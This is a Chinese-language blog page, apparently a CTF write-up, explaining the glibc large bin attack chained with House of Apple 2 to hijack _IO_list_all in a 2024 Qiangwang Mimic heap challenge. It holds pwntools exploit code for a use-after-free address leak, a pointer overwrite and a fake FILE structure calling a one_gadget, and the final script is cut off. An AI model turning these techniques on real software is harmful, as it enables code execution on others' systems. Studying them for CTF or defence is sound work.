@@ -1,0 +1,288 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Xilker's Blog | Xilker's Blog</title><meta name="author" content="Xilker"><meta name="copyright" content="Xilker"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="1234title: large bin attack学习date: 2025-10-23 11:32:34tags: [PWN,CTF]categories: [PWN]  large bin attack![image-20251023113054033](large bin attack&#x2F;image-20251023113054033.png) large bin attack原理">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Xilker&#39;s Blog">
+<meta property="og:url" content="https://xilker2237.github.io/2025/10/23/large%20bin%20attack/index.html">
+<meta property="og:site_name" content="Xilker&#39;s Blog">
+<meta property="og:description" content="1234title: large bin attack学习date: 2025-10-23 11:32:34tags: [PWN,CTF]categories: [PWN]  large bin attack![image-20251023113054033](large bin attack&#x2F;image-20251023113054033.png) large bin attack原理">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xilker2237.github.io/blog_card_picture/5.png">
+<meta property="article:published_time" content="2025-10-23T03:30:36.889Z">
+<meta property="article:modified_time" content="2026-02-13T03:12:02.892Z">
+<meta property="article:author" content="Xilker">
+<meta property="article:tag" content="博客,Blog,技术,学习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xilker2237.github.io/blog_card_picture/5.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "",
+  "url": "https://xilker2237.github.io/2025/10/23/large%20bin%20attack/",
+  "image": "https://xilker2237.github.io/blog_card_picture/5.png",
+  "datePublished": "2025-10-23T03:30:36.889Z",
+  "dateModified": "2026-02-13T03:12:02.892Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Xilker",
+      "url": "https://xilker2237.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://xilker2237.github.io/2025/10/23/large%20bin%20attack/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Xilker\'s Blog',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/runtime.css"><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/tags-style.css"><script src="/js/cache-images.js"></script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      if ($loadingBox.classList.contains('loaded')) return
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+
+  if (document.readyState === 'complete') {
+    preloader.endLoading()
+  } else {
+    window.addEventListener('load', preloader.endLoading)
+    document.addEventListener('DOMContentLoaded', preloader.endLoading)
+    // Add timeout protection: force end after 7 seconds
+    setTimeout(preloader.endLoading, 7000)
+  }
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:toRandomPost()"><i class="fa-fw fas fa-random"></i><span> 随机</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-users"></i><span> 社交</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page child" href="/comment/"><i class="fa-fw fas fa-comments"></i><span> 留言</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/blog_card_picture/5.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Xilker's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Xilker's Blog</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:toRandomPost()"><i class="fa-fw fas fa-random"></i><span> 随机</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-users"></i><span> 社交</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page child" href="/comment/"><i class="fa-fw fas fa-comments"></i><span> 留言</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">无标题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-23T03:30:36.889Z" title="发表于 2025-10-23 11:30:36">2025-10-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-13T03:12:02.892Z" title="更新于 2026-02-13 11:12:02">2026-02-13</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">title: large bin attack学习</span><br><span class="line">date: 2025-10-23 11:32:34</span><br><span class="line">tags: [PWN,CTF]</span><br><span class="line">categories: [PWN]</span><br></pre></td></tr></table></figure>
+
+<h1 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h1><p>![image-20251023113054033](large bin attack&#x2F;image-20251023113054033.png)</p>
+<h2 id="large-bin-attack原理"><a href="#large-bin-attack原理" class="headerlink" title="large bin attack原理"></a>large bin attack原理</h2><p> Glibc 在将一个 chunk 插入 Large Bin 时，会尝试将它链入已有的 chunk 链表中。如果我们将已有 chunk (Chunk 0) 的 <code>bk_nextsize</code> 指针修改为 <code>TargetAddr - 0x20</code>，由于链表操作逻辑： <code>victim-&gt;bk_nextsize-&gt;fd_nextsize = new_chunk</code> 系统就会执行： <code>*(TargetAddr - 0x20 + 0x20) = new_chunk</code> 即： <code>*TargetAddr = new_chunk</code></p>
+<h2 id="题目解析：2024年强网拟态初赛"><a href="#题目解析：2024年强网拟态初赛" class="headerlink" title="题目解析：2024年强网拟态初赛"></a>题目解析：2024年强网拟态初赛</h2><p>正常菜单题，增删改查都有</p>
+<p>![img](large bin attack&#x2F;1768324894522-2285af0d-60e8-47f3-8213-d6ea41775102.png)</p>
+<p>这里的add函数只能申请大于0x4ff的堆块，由于tache bin的范围在0x80-0x400，所以本题目要用到large bin attack加apple2链子来打</p>
+<p>![img](large bin attack&#x2F;1768324885760-02e2cae3-cba0-4b25-9854-61ffaa19cf6b.png)</p>
+<p>很明显的uaf,可以先泄露出来libc和堆地址</p>
+<p>![img](large bin attack&#x2F;1768325102677-51a07cf6-5f38-4e55-b465-b6da9a7c164b.png)</p>
+<p>先基本的堆布局,然后就是正常的泄露信息</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x510</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x21ace0</span></span><br><span class="line">log.success(xilker(<span class="string">f&#x27;libc_base--&gt;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x550</span>)  <span class="comment"># chunk0申请回来了,为了把chunk0从unsortbin放入到largebin中 这里注意要申请一个相对大一点chunk</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x290</span></span><br><span class="line">log.success(xilker(<span class="string">f&#x27;heap_base--&gt;<span class="subst">&#123;<span class="built_in">hex</span>(heap_base)&#125;</span>&#x27;</span>))</span><br><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">_IO_stdfile_2_lock = libc_base + <span class="number">0x21ca60</span>  <span class="comment"># stderr偏移0x88的位置</span></span><br><span class="line">ogg = libc_base + ogg[<span class="number">1</span>] </span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">target = libc_base + <span class="number">0x21ace0</span>  <span class="comment"># main_arena + 86</span></span><br><span class="line">log.success(xilker(<span class="string">f&#x27;IO--&gt;<span class="subst">&#123;<span class="built_in">hex</span>(target)&#125;</span>&#x27;</span>))</span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># # chunk2作为攻击块</span></span><br></pre></td></tr></table></figure>
+
+<p>这两个地址是我们后续要重点使用的，下面开始重点的large bin attack</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>这里开始large bin attack,我们先看一下没攻击前的堆布局chunk2作为攻击块，此时还在unsortbin中</p>
+<p>![img](large bin attack&#x2F;1768325457564-b75e1d28-6805-4cbf-9c7b-283078d86d59.png)</p>
+<p>![img](large bin attack&#x2F;1768325527217-39e04d79-1fe0-4963-95f7-2480a2a48090.png)</p>
+<p>此时我们刚泄露完地址的chunk0已经在largebin中，我们开始伪造指针，使得后面吧IO_list_all申请到chunk2来伪造io结构</p>
+<p>![img](large bin attack&#x2F;1768325627776-b27eb9f7-264a-4d8e-8ef5-9e01aa1a5d03.png)</p>
+<p>此时我们执行paylaod得到一下结果，bk_nextsize就是我们的IO_list_all地址，large_bin_attck在bk_nextsize指针上起作用，所以第二个target指针可以设置为0或者让他恢复为main_arena的可写地址避免麻烦，伪造fd_nextsize为本身，然后伪造bk_nextsize为IO_list_all-0x20</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p1 = p64(<span class="number">0</span>) + p64(target) + p64(heap_base + <span class="number">0x290</span>) + p64(_IO_list_all - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>, p1)</span><br></pre></td></tr></table></figure>
+
+<p>![img](large bin attack&#x2F;1768325812384-7058b005-f325-43ed-82b5-a90cb1bbeaa8.png)</p>
+<p>![img](large bin attack&#x2F;1768325741763-1a138fb5-867a-4031-93d1-58ae192ea2bf.png)</p>
+<p>![img](large bin attack&#x2F;1768325722087-be804d0a-ef16-450c-8a0c-b0704f970962.png)</p>
+<h3 id="写-IO-list-all-0x20的原因"><a href="#写-IO-list-all-0x20的原因" class="headerlink" title="写 _IO_list_all - 0x20的原因"></a>写 <code>_IO_list_all - 0x20</code>的原因</h3><p>在 Glibc 把一个新堆块（假设是 Chunk 2）插入到这个 Large Bin 的过程中，如果满足插入条件，会执行如下宏操作：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 简化后的 Glibc 源码逻辑</span></span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">victim-&gt;fd_nextsize = fwd;  <span class="comment">// fwd前一个大小不一样堆块</span></span><br><span class="line">fwd-&gt;bk_nextsize = victim;  <span class="comment">// bck // 后一个大小不一样的堆块</span></span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">// &lt;--- 关键！</span></span><br></pre></td></tr></table></figure>
+
+<p>当把 <code>fwd-&gt;bk_nextsize</code> 修改为 <code>_IO_list_all - 0x20</code> 后：</p>
+<ol>
+<li><code>victim-&gt;bk_nextsize</code> 变成了 <code>_IO_list_all - 0x20</code>。</li>
+<li>最后一句话变成了：<code>(_IO_list_all - 0x20)-&gt;fd_nextsize = victim</code>。</li>
+<li>由于 <code>fd_nextsize</code> 字段相对于堆块头部的偏移正好是 <code>**0x20**</code>。</li>
+<li>结果就是：<code>*(_IO_list_all - 0x20 + 0x20) = victim</code>。</li>
+<li>即：<code>_IO_list_all</code> <strong>的内容被改写成了</strong> <code>victim</code> <strong>的堆地址</strong>。</li>
+</ol>
+<p>接着我们去申请一个大的chunk，触发malloc申请机制，吧chunk</p>
+<p>![img](large bin attack&#x2F;1768326210324-01f1c4be-8ee9-453d-afbf-4c48a4d47276.png)</p>
+<p>![img](large bin attack&#x2F;1768326502477-b7004c75-bdf6-471b-8d47-a309caeca601.png)</p>
+<p>这里就会有一个问题: 这个paylaod结束后我申请了0x550大小的堆块，为什么在0chunk构造的_IO_list_all-0x20指针，此时会变为chunk2的bk_nextsize为_IO_list_all?,以下是gemini3的回答</p>
+<p>简单一句话总结：<strong>因为在 Large Bin Attack 的过程中，Glibc 会把新插入的 Chunk 2 “强行”插入到你伪造的</strong> <code>**bk_nextsize**</code> <strong>链表节点之间。</strong></p>
+<p>让我们通过 Glibc 的源码逻辑（通常是 <code>malloc.c</code> 中的 <code>_int_malloc</code> 整理 Unsorted Bin 的部分）来还原这个过程：</p>
+<p><strong>1. 攻击发生前的状态</strong></p>
+<ul>
+<li>**Chunk 0 (在 Large Bin 中)**：你的 payload 已经把它的 <code>bk_nextsize</code> 改成了 <code>_IO_list_all - 0x20</code>。</li>
+<li>**Target (目标位置)**：此时 <code>_IO_list_all</code> 偏移 0 处的内容还是旧的（比如指向 <code>stderr</code> 或者 <code>0</code>）。</li>
+<li>**Chunk 2 (在 Unsorted Bin 中)**：正准备被 <code>malloc(0x550)</code> 整理进 Large Bin。</li>
+</ul>
+<p><strong>2. 插入逻辑触发 (关键源码追踪)</strong></p>
+<p>当 Glibc 确定 Chunk 2 应该插入到 Chunk 0 所在的这个 Large Bin 链表，并且 Chunk 2 的大小适合作为 Chunk 0 的“后继”时，会执行类似下面的代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设 fwd 是 Chunk 0</span></span><br><span class="line"><span class="comment">// victim 是新来的 Chunk 2</span></span><br><span class="line"></span><br><span class="line">victim-&gt;fd_nextsize = fwd;               <span class="comment">// 1. Chunk 2 的 fd_nextsize 指向 Chunk 0</span></span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;  <span class="comment">// 2. Chunk 2 的 bk_nextsize 拿到了 Chunk 0 原本的 bk_nextsize</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时由于你改了 Chunk 0 的 bk_nextsize，</span></span><br><span class="line"><span class="comment">// 所以 victim-&gt;bk_nextsize = _IO_list_all - 0x20</span></span><br><span class="line"></span><br><span class="line">fwd-&gt;bk_nextsize = victim;               <span class="comment">// 3. Chunk 0 的 bk_nextsize 指向 Chunk 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 绝杀的一步 ---</span></span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>
+
+<p>由于在第 2 步中，<code>victim-&gt;bk_nextsize</code> 被赋成了 <code>_IO_list_all - 0x20</code>，那么第 4 步实际上变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((_IO_list_all - 0x20))-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>
+
+<p>在 Glibc 的 <code>malloc_chunk</code> 结构体中，<code>fd_nextsize</code> 字段相对于当前地址的偏移正好是 <strong>0x20</strong>。所以： <code>*(_IO_list_all - 0x20 + 0x20) = victim;</code> 即： <code>*(_IO_list_all) = Chunk 2的地址;</code></p>
+<ul>
+<li><strong>Chunk 0</strong> 的 <code>bk_nextsize</code> 现在指向 <strong>Chunk 2</strong>。</li>
+<li><strong>Chunk 2</strong> 的 <code>bk_nextsize</code> 指向了 <code>**_IO_list_all - 0x20**</code>。</li>
+<li><code>**_IO_list_all**</code> 处的值变成了 <strong>Chunk 2</strong> 的地址（被当成了 <code>fd_nextsize</code> 写入了）。</li>
+</ul>
+<p> 现在 <code>_IO_list_all</code> 已经被劫持指向了 Chunk 2，当程序执行 <code>exit</code> 或从 <code>main</code> 返回时，系统会遍历 <code>_IO_list_all</code> 并尝试刷新缓冲区。我们需要在 Chunk 2 里伪造好结构体  </p>
+<p><strong>下面就是在chunk2中伪造IO结构体</strong></p>
+<p>House of Apple 2 的核心是利用 <code>_IO_wfile_overflow</code> 函数。调用链如下：</p>
+<ol>
+<li>系统调用 <code>_IO_OVERFLOW(fp)</code>。</li>
+<li>我们把 <code>vtable</code> 劫持为 <code>_IO_wfile_jumps</code>，所以实际调用的是 <code>_IO_wfile_overflow</code>。</li>
+<li><code>_IO_wfile_overflow</code> 内部检查 <code>_wide_data</code>，并最终通过 <code>_wide_vtable</code> 调用函数： <code>*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></li>
+</ol>
+<p>这里是一个apple2模板，可以直接用</p>
+<p>有一点要注意的是heap_addr和target_addr是根据当前堆布局算出来的，这里的0x290就是计算堆基地址的偏移，然后0x500是攻击chunk2堆块地址的前一个chunk大小，0x550是刚才申请的chunk大小。0x550和0x500都是可以变的。至于模板里的偏移是固定的</p>
+<p>这里的偏移只要满足计算完的长度刚好是这个攻击块的chunk就可以，偏移有误差可以手动计算一下</p>
+<p>![img](large bin attack&#x2F;1768328528575-82c08c2e-f39a-4386-9852-c08173823831.png)</p>
+<p>![img](large bin attack&#x2F;1768327050683-b6ca44ef-3946-404a-b75c-cfdaea5dc6bb.png)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">p2 = b<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">p2 = p2.ljust(<span class="number">0x18</span>, b<span class="string">&#x27;\x00&#x27;</span>) + p64(<span class="number">1</span>)</span><br><span class="line">p2 = p2.ljust(<span class="number">0x90</span>, b<span class="string">&#x27;\x00&#x27;</span>) + p64(heap_addr + <span class="number">0xe0</span>)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xc8</span>, b<span class="string">&#x27;\x00&#x27;</span>) + p64(_IO_wfile_jumps)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xd0</span> + <span class="number">0xe0</span>, b<span class="string">&#x27;\x00&#x27;</span>) + p64(target_addr + <span class="number">0xe0</span> + <span class="number">0xe8</span>)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xd0</span> + <span class="number">0xe8</span> + <span class="number">0x68</span>, b<span class="string">&#x27;\x00&#x27;</span>) + p64(ogg)</span><br><span class="line">from pwn import *</span><br><span class="line">import json</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)  </span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def xilker(x, code=<span class="number">95</span>):</span><br><span class="line">    <span class="keyword">return</span> f<span 